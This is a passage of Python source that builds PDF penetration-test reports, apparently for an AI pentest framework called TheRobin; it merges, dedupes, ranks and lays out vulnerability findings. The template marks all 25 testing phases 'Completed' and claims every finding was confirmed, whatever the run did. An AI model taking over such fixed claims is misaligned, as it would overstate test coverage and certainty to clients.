                    _img.hAlign = "CENTER"
                    elements.append(_img)
                    elements.append(Spacer(1, 1 * mm))
                    # Professional figure caption: "Figure N: Vulnerability Name"
                    _fig_style = ParagraphStyle(
                        "_fig_caption", parent=styles["SmallText"],
                        fontSize=8, alignment=TA_CENTER,
                        textColor=HexColor("#555555"), fontName="Helvetica-Oblique",
                    )
                    elements.append(Paragraph(
                        f"Figure {i}: {_xml_safe(title)}",
                        _fig_style,
                    ))
                    elements.append(Spacer(1, 3 * mm))
                except Exception:
                    pass

        elements.append(Spacer(1, 3 * mm))

        # ── 5.X.4  Recommended Solution ─────────────────────────────
        elements.append(Paragraph(f"{sec}.4  Recommended Solution", styles["SubSection"]))
        elements.append(Paragraph(
            "In order to mitigate this issue, we recommend implementing the following "
            "mitigations and protections:",
            styles["Body"],
        ))
        elements.append(Spacer(1, 2 * mm))

        custom_rem = f.get("remediation", detail.get("remediation", ""))
        # Use custom remediation only if it's substantial (multi-line or > 100 chars);
        # otherwise prefer the full mitigation template steps
        use_custom = custom_rem and (len(custom_rem) > 100 or "\n" in custom_rem.strip())
        if use_custom:
            for line in custom_rem.strip().splitlines():
                line = line.strip().lstrip("•\u2022- ")
                if line:
                    elements.append(Paragraph(
                        f"\u2022  {_xml_safe(line)}", styles["BulletItem"]))
        # Always include the template steps (they provide comprehensive guidance)
        for step in mitigation["steps"]:
            step_text = _xml_safe(step)
            # Skip if this step is already covered by the custom remediation
            if use_custom and step_text[:40].lower() in custom_rem.lower():
                continue
            elements.append(Paragraph(
                f"\u2022  {_xml_safe(step)}", styles["BulletItem"]))

        refs = mitigation.get("refs",
                               [("OWASP Top 10", "https://owasp.org/www-project-top-ten/")])
        elements.append(Spacer(1, 3 * mm))
        elements.append(Paragraph("More information can be found at:", styles["Body"]))
        for _, ref_url in refs:
            elements.append(Paragraph(
                f'\u2022  <a href="{_xml_safe(ref_url)}" color="#1565C0">'
                f'{_xml_safe(ref_url)}</a>',
                styles["BulletItem"],
            ))
        elements.append(Spacer(1, 5 * mm))

        # ── 5.X.5  Risk Matrix + 5.X.6  Risk Classification ────────
        # Wrap both in KeepTogether so they never split across pages
        risk_block = []
        risk_block.append(Paragraph(f"{sec}.5  Risk Matrix", styles["SubSection"]))
        risk_block.extend(_build_zdl_risk_matrix(lkl, sc_idx, styles))
        risk_block.append(Paragraph(f"{sec}.6  Risk Classification", styles["SubSection"]))
        risk_block.extend(_build_zdl_risk_classification(
            title, sev, lkl, sc_idx, sc_val, risk_val, risk_label, cvss_str, styles,
        ))
        elements.append(KeepTogether(risk_block))

        elements.append(PageBreak())

    return elements


def _build_scope_methodology(target, scope, styles):
    """Build scope and methodology section."""
    elements = []
    elements.append(Paragraph("3. Scope &amp; Methodology", styles["SectionTitle"]))
    elements.append(_section_hr())

    scope_data = [
        ["Item", "Details"],
        ["Target URL", _xml_safe(target)],
        ["In-Scope", _xml_safe(scope)],
        ["Testing Approach", "Grey-box (valid credentials provided)"],
        ["Out of Scope", "Denial of Service, social engineering, physical access"],
        ["Methodology", "OWASP Top 10 (2021), PTES, OWASP WSTG"],
    ]
    scope_table = Table(scope_data, colWidths=[45 * mm, 120 * mm])
    scope_table.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), HexColor("#F0F0F0")),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTNAME", (0, 1), (0, -1), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 10),
        ("GRID", (0, 0), (-1, -1), 0.5, HexColor("#CCCCCC")),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("BACKGROUND", (0, 1), (0, -1), HexColor("#FAFAFA")),
    ]))
    elements.append(scope_table)
    elements.append(Spacer(1, 6 * mm))

    # Testing phases
    elements.append(Paragraph("3.1 Testing Phases", styles["SubSection"]))
    phases = [
        (1, "Reconnaissance & Crawling"), (2, "Security Headers"),
        (3, "Authentication & Session Setup"), (4, "JavaScript Secret Scanning"),
        (5, "Session Management"), (6, "XSS — Reflected & Stored"),
        (7, "XSS — DOM-Based"), (8, "SQL Injection"),
        (9, "NoSQL Injection"), (10, "Cross-Site Request Forgery"),
        (11, "Technology Fingerprinting"), (12, "CORS, Redirect, SSL/TLS, JWT"),
        (13, "Deep JWT Testing"), (14, "Command Injection"),
        (15, "Server-Side Template Injection"), (16, "Server-Side Request Forgery"),
        (17, "Insecure Deserialization"), (18, "File Upload"),
        (19, "GraphQL"), (20, "HTTP Protocol Attacks"),
        (21, "IDOR / Access Control"), (22, "Business Logic"),
        (23, "XXE & Path Traversal"), (24, "API Security"),
        (25, "Race Conditions"),
    ]
    phase_data = [["Phase", "Category", "Status"]]
    for num, name in phases:
        phase_data.append([str(num), name, "Completed"])

    phase_table = Table(phase_data, colWidths=[18 * mm, 110 * mm, 30 * mm])
    phase_table.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), HexColor("#F0F0F0")),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 8),
        ("GRID", (0, 0), (-1, -1), 0.5, HexColor("#DDDDDD")),
        ("ALIGN", (0, 0), (0, -1), "CENTER"),
        ("ALIGN", (2, 0), (2, -1), "CENTER"),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("TOPPADDING", (0, 0), (-1, -1), 3),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 3),
    ]))
    # Alternate row colors
    for i in range(1, len(phase_data)):
        if i % 2 == 0:
            phase_table._argW  # force init
    elements.append(phase_table)
    elements.append(PageBreak())
    return elements


def _build_remediation_roadmap(findings, styles):
    """Build remediation roadmap section."""
    elements = []
    elements.append(Paragraph("6. Remediation Roadmap", styles["SectionTitle"]))
    elements.append(_section_hr())

    priority_groups = [
        ("6.1 Immediate (0-48 hours) — Critical Risk", "P1", "CRITICAL"),
        ("6.2 Short-Term (1-2 weeks) — High Risk", "P2", "HIGH"),
        ("6.3 Medium-Term (1 month) — Moderate Risk", "P3", "MEDIUM"),
        ("6.4 Long-Term (next release) — Low Risk", "P4", "LOW"),
    ]

    for section_title, priority, sev_level in priority_groups:
        elements.append(Paragraph(section_title, styles["SubSection"]))
        items = [f for f in findings if f.get("severity", "").upper() == sev_level]
        if sev_level == "LOW":
            items += [f for f in findings if f.get("severity", "").upper() == "INFO"]

        if not items:
            elements.append(Paragraph(
                "<i>No findings at this priority level.</i>", styles["Body"]))
            continue

        prio_data = [["Priority", "Finding", "Action Required"]]
        for f in items:
            title = _xml_safe(_normalize_title(f.get("title", "—")))[:60]
            mit = _get_mitigation(f.get("title", ""))
            action = _xml_safe(mit["steps"][0])[:100] if mit["steps"] else "See detailed finding."
            prio_data.append([
                priority,
                Paragraph(title, styles["SmallText"]),
                Paragraph(action, styles["SmallText"]),
            ])

        prio_table = Table(prio_data, colWidths=[18 * mm, 65 * mm, 82 * mm])
        prio_table.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, 0), HexColor("#F0F0F0")),
            ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
            ("FONTSIZE", (0, 0), (-1, -1), 9),
            ("GRID", (0, 0), (-1, -1), 0.5, HexColor("#CCCCCC")),
            ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
            ("ALIGN", (0, 0), (0, -1), "CENTER"),
            ("TOPPADDING", (0, 0), (-1, -1), 4),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ]))
        elements.append(prio_table)
        elements.append(Spacer(1, 3 * mm))

    # Strategic recommendations
    elements.append(Paragraph("6.5 Strategic Recommendations", styles["SubSection"]))
    recommendations = [
        "Implement centralised input validation and sanitisation using a whitelist approach across all endpoints.",
        "Deploy standardised security headers (CSP, HSTS, X-Frame-Options, X-Content-Type-Options) via middleware.",
        "Implement account lockout, multi-factor authentication, and session regeneration on login.",
        "Integrate SAST/DAST tools into the CI/CD pipeline to catch vulnerabilities before deployment.",
        "Establish a process for monitoring and updating third-party libraries and dependencies.",
    ]
    for j, rec in enumerate(recommendations, 1):
        elements.append(Paragraph(f"<b>{j}.</b> {_xml_safe(rec)}", styles["NumberedItem"]))

    elements.append(PageBreak())
    return elements


def _build_conclusion(target, counts, rating, styles):
    """Build conclusion section."""
    elements = []
    elements.append(Paragraph("7. Conclusion", styles["SectionTitle"]))
    elements.append(_section_hr())

    total = sum(counts.values())
    elements.append(Paragraph(
        f"The penetration test of <b>{_xml_safe(target)}</b> identified <b>{total} "
        f"vulnerabilities</b> across multiple severity levels. The overall security posture is "
        f"rated as <b>{rating}</b>.",
        styles["Body"]
    ))

    if rating in ("CRITICAL", "POOR"):
        elements.append(Paragraph(
            "Critical vulnerabilities require <b>immediate attention</b> as they allow direct "
            "exploitation by an unauthenticated attacker. The application should not be considered "
            "safe for production use until all Critical and High findings are remediated.",
            styles["Body"]
        ))
    elif rating == "MODERATE":
        elements.append(Paragraph(
            "While no critical issues were found, the identified medium-severity findings should "
            "be addressed to strengthen the application's security posture.",
            styles["Body"]
        ))
    else:
        elements.append(Paragraph(
            "The application demonstrates a solid security posture with only minor issues identified.",
            styles["Body"]
        ))

    elements.append(Paragraph(
        "A re-test is recommended after remediation to verify that all identified vulnerabilities "
        "have been properly addressed and no regressions have been introduced.",
        styles["Body"]
    ))
    elements.append(PageBreak())
    return elements


def _build_appendix(styles):
    """Build severity definitions appendix."""
    elements = []
    elements.append(Paragraph("Appendix A — Severity Rating Definitions", styles["SectionTitle"]))
    elements.append(_section_hr())

    sev_data = [["Severity", "CVSS Range", "Definition"]]
    sev_defs = [
        ("CRITICAL", "9.0 - 10.0",
         "Vulnerability can be exploited remotely with no authentication, leading to full system "
         "compromise, data breach, or remote code execution. Immediate remediation required."),
        ("HIGH", "7.0 - 8.9",
         "Significant impact. May require authentication, user interaction, or specific conditions. "
         "Should be remediated within days."),
        ("MEDIUM", "4.0 - 6.9",
         "Moderate risk. Exploitation may be limited in scope or require chaining with other issues. "
         "Remediate within weeks."),
        ("LOW", "0.1 - 3.9",
         "Minor security issue with minimal direct impact. Remediate during normal development cycle."),
        ("INFO", "0.0",
         "Observation or best-practice recommendation with no direct security impact."),
    ]

    for sev, cvss_range, definition in sev_defs:
        sev_data.append([
            _sev_badge(sev, styles),
            cvss_range,
            Paragraph(_xml_safe(definition), styles["SmallText"]),
        ])

    sev_table = Table(sev_data, colWidths=[24 * mm, 25 * mm, 116 * mm])
    sev_table.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), HexColor("#F0F0F0")),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 9),
        ("GRID", (0, 0), (-1, -1), 0.5, HexColor("#CCCCCC")),
        ("ALIGN", (0, 1), (0, -1), "CENTER"),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("TOPPADDING", (0, 0), (-1, -1), 7),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 7),
    ]))
    elements.append(sev_table)
    elements.append(Spacer(1, 10 * mm))

    elements.append(Paragraph("Appendix B — CVSS v3.1 Reference", styles["SectionTitle"]))
    elements.append(_section_hr())
    elements.append(Paragraph(
        'All CVSS scores in this report are calculated using the CVSS v3.1 specification. '
        'For more information see: <a href="https://www.first.org/cvss/v3.1/specification-document" '
        'color="#1565C0">first.org/cvss/v3.1</a>',
        styles["Body"]
    ))
    elements.append(Spacer(1, 20 * mm))

    # Footer disclaimer
    elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor("#CCCCCC"),
                                spaceBefore=10, spaceAfter=6))
    elements.append(Paragraph(
        "This report is confidential and intended solely for the authorised recipient.<br/>"
        "All findings have been confirmed through active testing with proof-of-concept evidence.",
        styles["FooterText"]
    ))
    return elements


# ── Main generator ────────────────────────────────────────────────────────────

def generate_pdf_report(g: dict, output_path: str = "report.pdf") -> str:
    """
    Generate a professional PDF pentest report from the _G globals dict.

    Parameters
    ----------
    g : dict
        The _G persistent globals dict from the REPL.
    output_path : str
        Where to write the PDF file.

    Returns
    -------
    str : the output file path
    """
    target = g.get("BASE", g.get("target", "Unknown"))
    scope = g.get("SCOPE", target)
    date_str = datetime.date.today().strftime("%Y-%m-%d")

    # ── Aggregate all findings ────────────────────────────────────────
    all_findings = list(g.get("FINDINGS", []))

    for sf in g.get("SQLI_FINDINGS", []):
        all_findings.append({
            "severity": "CRITICAL",
            "title": f"SQL Injection — {sf.get('type', 'SQLi')} ({sf.get('field', '')})",
            "url": sf.get("url", ""), "detail": sf,
        })
    for cf in g.get("CMDI_FINDINGS", []):
        all_findings.append({
            "severity": "CRITICAL",
            "title": f"Command Injection — {cf.get('param', '')} ({cf.get('method', '')})",
            "url": cf.get("url", ""), "detail": cf,
        })
    for xf in g.get("XSS_FINDINGS", []):
        all_findings.append({
            "severity": xf.get("severity", "HIGH"),
            "title": f"XSS — {xf.get('type', 'XSS')} in {xf.get('param', '')}",
            "url": xf.get("url", ""), "detail": xf,
        })
    for idf in g.get("IDOR_FINDINGS", []):
        all_findings.append({
            "severity": idf.get("severity", "HIGH"),
            "title": f"IDOR — {idf.get('type', 'IDOR')}",
            "url": idf.get("url", ""), "detail": idf,
        })
    for jf in g.get("JS_FINDINGS", []):
        all_findings.append({
            "severity": jf.get("sev", jf.get("severity", "HIGH")),
            "title": f"JS: {jf.get('type', 'JS Issue')}",
            "url": jf.get("file", jf.get("url", "")), "detail": jf,
        })

    # Sort by severity
    all_findings.sort(key=lambda f: SEV_RANK.get(f.get("severity", "INFO").upper(), 4))

    # ── Filter out junk / summary lines that got captured as findings ──
    import re as _re
    _JUNK_RE = _re.compile(
        r'(findings?\s*:\s*\d+'              # "findings : 4", "finding(s): 0"
        r'|\d+\s*finding'                     # "76 finding(s)", "2 findings"
        r'|\bfound on \d+ \w+'               # "SSTI found on 4 parameter(s)!"
        r'|\d+ potential\b'                   # "81 potential DOM XSS source→sink chains"
        r'|\bsummary\b|\btested\b|\bskipping\b|\bdone\b'
        r'|\bgood\b|\brejected\b|\bnot vulnerable\b|\bno\s+(issues|vulns?|findings?)\b'
        r'|\bphase\s+\d+\b|\bstored\s+\d+|\bchecked\b'
        r'|\bchains? found\b'                # "81 ... chains found"
        r'|\binvestigate manually\b'          # "investigate manually" — not a confirmed finding
        r')',
        _re.IGNORECASE,
    )
    all_findings = [
        f for f in all_findings
        if not _JUNK_RE.search(f.get("title", ""))
        and len(f.get("title", "")) >= 8
    ]

    # ── Smart deduplication ────────────────────────────────────────────
    _VULN_CATEGORIES = {
        # IDOR — split into sub-categories for better grouping
        'horizontal idor': 'Horizontal IDOR',
        'vertical idor': 'Vertical IDOR',
        'unauthenticated api': 'Unauthenticated API Access',
        'unauthenticated access': 'Unauthenticated API Access',
        'idor': 'IDOR', 'api idor': 'Unauthenticated API Access',
        'privilege escalation': 'Privilege Escalation', 'privesc': 'Privilege Escalation',
        'mass assignment': 'Mass Assignment', 'mass-assignment': 'Mass Assignment',
        'stored xss': 'Stored XSS', 'reflected xss': 'Reflected XSS',
        'dom xss': 'DOM XSS', 'dom sink': 'DOM XSS',
        'xss': 'XSS', 'cross-site scripting': 'XSS',
        'sqli': 'SQLi', 'sql injection': 'SQLi',
        'csrf': 'CSRF', 'cross-site request forgery': 'CSRF',
        'ssrf': 'SSRF', 'server-side request forgery': 'SSRF',
        'ssti': 'SSTI', 'template injection': 'SSTI',
        'jwt': 'JWT', 'json web token': 'JWT',
        'workflow bypass': 'Workflow Bypass', 'workflow-bypass': 'Workflow Bypass',
        'step accessible': 'Workflow Bypass', 'accessible directly': 'Workflow Bypass',
        'checkout': 'Workflow Bypass',
        'business logic': 'Business Logic',
        'command injection': 'Command Injection', 'cmdi': 'Command Injection',
        'xxe': 'XXE', 'xml external entity': 'XXE',
        'file upload': 'File Upload',
        'path traversal': 'Path Traversal', 'directory traversal': 'Path Traversal',
        'open redirect': 'Open Redirect',
        'cors': 'CORS',
        'default credentials': 'Default Credentials',
        'account lockout': 'Account Lockout', 'no account lockout': 'Account Lockout',
        'password policy': 'Password Policy', 'weak password': 'Password Policy',
        'account enumeration': 'Account Enumeration',
        'database error': 'Database Error Disclosure',
        'information disclosure': 'Information Disclosure',
        'rate limit': 'Rate Limiting', 'no-rate-limit': 'Rate Limiting',
        'no rate limit': 'Rate Limiting',
        'api-docs': 'API Docs Exposed', 'api docs': 'API Docs Exposed',
        'swagger': 'API Docs Exposed', 'openapi': 'API Docs Exposed',
        'excessive data': 'Excessive Data Exposure',
        'prototype pollution': 'Prototype Pollution',
        'request smuggling': 'HTTP Smuggling', 'cl+te': 'HTTP Smuggling', 'smuggling': 'HTTP Smuggling',
        'method override': 'HTTP Method Override',
        'system user disclosed': 'Information Disclosure',
        'disallowed path': 'Robots Disallowed Path',
        'prometheus': 'Metrics Exposed', 'metrics accessible': 'Metrics Exposed',
        'hardcoded': 'Hardcoded Secrets',
    }

    # Categories where ALL findings should collapse to ONE regardless of URL
    # (e.g., "Vertical IDOR on /admin" and "Vertical IDOR on /debug" = ONE finding)
    _COLLAPSE_ALL = {
        'Vertical IDOR', 'Unauthenticated API Access', 'Workflow Bypass', 'Rate Limiting', 'Account Lockout',
        'Password Policy', 'Account Enumeration', 'API Docs Exposed',
        'Default Credentials', 'Database Error Disclosure', 'Information Disclosure',
        'DOM XSS', 'Prototype Pollution', 'HTTP Smuggling', 'HTTP Method Override',
        'Metrics Exposed', 'Hardcoded Secrets', 'SSTI', 'Mass Assignment',
        'Excessive Data Exposure', 'Business Logic', 'Robots Disallowed Path',
    }

    def _extract_category(title):
        """Extract vulnerability category from title for grouping."""
        t = title.lower()
        # Check longer keywords first (more specific matches)
        for keyword, cat in sorted(_VULN_CATEGORIES.items(), key=lambda x: -len(x[0])):
            if keyword in t:
                return cat
        return None

    def _normalize_url(url):
        """Normalize URL: strip query, collapse numeric segments."""
        u = _re.sub(r'[?#].*$', '', (url or "")).rstrip("/").lower()
        u = _re.sub(r'/\d+', '/N', u)
        u = _re.sub(r'/#/', '/', u)
        return u

    def _normalize_title(title):
        """Normalize title for comparison."""
        t = title.lower().strip()
        t = _re.sub(r'^\[?(critical|high|medium|low|info)\]?\s*[:\-—]*\s*', '', t)
        t = _re.sub(r'[\s\-—:]+', ' ', t).strip()
        t = _re.sub(r'https?://\S+', '', t).strip()
        # Strip fuzz/payload details: "(fuzz=...)", "field=...", "param=..."
        t = _re.sub(r'\(fuzz[^)]*\)', '', t).strip()
        t = _re.sub(r'field=\S+', '', t).strip()
        t = _re.sub(r'param=\S+', '', t).strip()
        return t

    seen_exact = set()
    # For COLLAPSE_ALL categories: (category) → (best_finding, sev_rank, count, urls)
    collapse_map = {}
    # For per-URL categories: (category, normalized_url) → (best_finding, sev_rank)
    category_url_map = {}
    # For uncategorized: (norm_title, norm_url) → (finding, sev_rank)
    title_map = {}
    deduped = []

    for f in all_findings:
        title = f.get("title", "")
        url = f.get("url", "")

        # Exact dedup first
        exact_key = (title, url)
        if exact_key in seen_exact:
            continue
        seen_exact.add(exact_key)

        norm_url = _normalize_url(url)
        norm_title = _normalize_title(title)
        category = _extract_category(title)
        sev_rank = SEV_RANK.get(f.get("severity", "INFO").upper(), 4)

        if category:
            if category in _COLLAPSE_ALL:
                # ALL findings in this category → ONE entry
                if category in collapse_map:
                    existing_f, existing_rank, count, urls = collapse_map[category]
                    urls.add(norm_url)
                    if sev_rank < existing_rank:
                        idx = deduped.index(existing_f)
                        deduped[idx] = f
                        collapse_map[category] = (f, sev_rank, count + 1, urls)
                    else:
                        collapse_map[category] = (existing_f, existing_rank, count + 1, urls)
                    continue
                collapse_map[category] = (f, sev_rank, 1, {norm_url})
            else:
                # Group by (category, normalized_url)
                cat_key = (category, norm_url)
                if cat_key in category_url_map:
                    existing_f, existing_rank = category_url_map[cat_key]
                    if sev_rank < existing_rank:
                        deduped[deduped.index(existing_f)] = f
                        category_url_map[cat_key] = (f, sev_rank)
                    continue
                category_url_map[cat_key] = (f, sev_rank)
        else:
            # No category — use normalized title + url
            title_key = (norm_title, norm_url)
            if title_key in title_map:
                existing_f, existing_rank = title_map[title_key]
                if sev_rank < existing_rank:
                    deduped[deduped.index(existing_f)] = f
                    title_map[title_key] = (f, sev_rank)
                continue
            # Substring overlap check
            skip = False
            for (et, eu), (ef, er) in list(title_map.items()):
                if norm_url == eu or not norm_url or not eu:
                    if len(norm_title) > 5 and len(et) > 5:
                        if norm_title in et or et in norm_title:
                            skip = True
                            break
            if skip:
                continue
            title_map[title_key] = (f, sev_rank)

        deduped.append(f)

    # Post-process: annotate collapsed findings with affected endpoint count
    for category, (best_f, _, count, urls) in collapse_map.items():
        if count > 1:
            real_urls = {u for u in urls if u}
            if real_urls:
                best_f["title"] = f"{best_f['title']} (+{count - 1} more endpoints)"
            else:
                best_f["title"] = f"{best_f['title']} ({count} instances)"

    all_findings = deduped

    # ── Counts ────────────────────────────────────────────────────────
    counts = {}
    for f in all_findings:
        sev = f.get("severity", "INFO").upper()
        counts[sev] = counts.get(sev, 0) + 1
    rating = _overall_rating(counts)

    # ── Build PDF ─────────────────────────────────────────────────────
    styles = _build_styles()

    doc = SimpleDocTemplate(
        output_path,
        pagesize=A4,
        topMargin=18 * mm,
        bottomMargin=25 * mm,
        leftMargin=18 * mm,
        rightMargin=18 * mm,
        title=f"Penetration Test Report — {target}",
        author="TheRobin — AI Penetration Testing Framework",
        subject="Web Application Security Assessment",
    )

    elements = []

    # Cover page
    elements.extend(_build_cover(target, date_str, scope, styles))

    # Management summary
    elements.extend(_build_management_summary(target, counts, rating, all_findings, styles))

    # Findings overview
    elements.extend(_build_findings_overview(all_findings, counts, styles))

    # Scope & methodology (Section 3)
    elements.extend(_build_scope_methodology(target, scope, styles))

    # Detailed findings (Section 5)
    elements.extend(_build_detailed_findings(all_findings, styles))

    # Remediation roadmap
    elements.extend(_build_remediation_roadmap(all_findings, styles))

    # Conclusion
    elements.extend(_build_conclusion(target, counts, rating, styles))

    # Appendix
    elements.extend(_build_appendix(styles))

    # ── Build ─────────────────────────────────────────────────────────
    doc.build(elements, onFirstPage=_cover_header_footer, onLaterPages=_header_footer)

    out = Path(output_path)
    return str(out.resolve())
